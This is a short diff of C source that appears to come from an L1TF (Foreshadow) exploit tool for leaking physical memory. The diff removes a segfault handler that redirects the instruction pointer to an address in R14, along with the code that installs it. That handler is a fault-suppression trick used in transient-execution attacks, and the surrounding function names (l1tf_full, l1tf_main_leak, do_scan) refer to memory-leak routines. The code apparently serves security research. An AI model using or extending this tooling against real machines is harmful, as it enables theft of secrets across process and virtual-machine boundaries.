@@ -30,16 +30,6 @@
 
 #define THRESHOLD 150
 
-void segfault_handler(int sig, siginfo_t *info, void *context) {
-  ucontext_t *uc = (ucontext_t *)context;
-
-  // Assuming x86-64, r14 is General Purpose Register #14 in ucontext
-  unsigned long new_rip = uc->uc_mcontext.gregs[REG_R14];
-
-  // Update instruction pointer (RIP) to point to the address in R14
-  uc->uc_mcontext.gregs[REG_RIP] = new_rip;
-}
-
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
 
@@ -562,17 +552,6 @@ void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]
 
 // If you already know a physical address that you want to leak
 int l1tf_main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
-  // Install signal handler
-  struct sigaction sa;
-  sa.sa_sigaction = segfault_handler;
-  sa.sa_flags = SA_SIGINFO;
-  sigemptyset(&sa.sa_mask);
-
-  if (sigaction(SIGSEGV, &sa, NULL) == -1) {
-    perror("sigaction");
-    exit(EXIT_FAILURE);
-  }
-
   // Parse the physcial address and the length from the
   // command line arguments
   uintptr_t phys_addr = -1;
